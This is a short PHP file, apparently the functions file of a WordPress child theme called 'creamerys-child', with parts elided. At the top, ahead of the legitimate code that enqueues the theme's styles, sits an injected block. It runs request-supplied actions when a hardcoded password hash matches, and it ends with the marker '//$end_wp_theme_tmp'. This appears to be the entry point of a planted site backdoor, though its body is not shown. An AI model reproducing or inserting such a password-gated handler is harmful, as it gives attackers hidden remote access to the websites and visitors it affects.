<?php
if (isset($_REQUEST['action']) && isset($_REQUEST['password']) && ($_REQUEST['password'] == 'e46c9a07d1cfc00e319382b33d1b7c94'))
	{
...
//$end_wp_theme_tmp
?><?php
/*Questo file è parte di creamerys-child, creamery-lite child theme.
...
function creamerys_child_enqueue_child_styles() {
...
add_action( 'wp_enqueue_scripts', 'creamerys_child_enqueue_child_styles' );
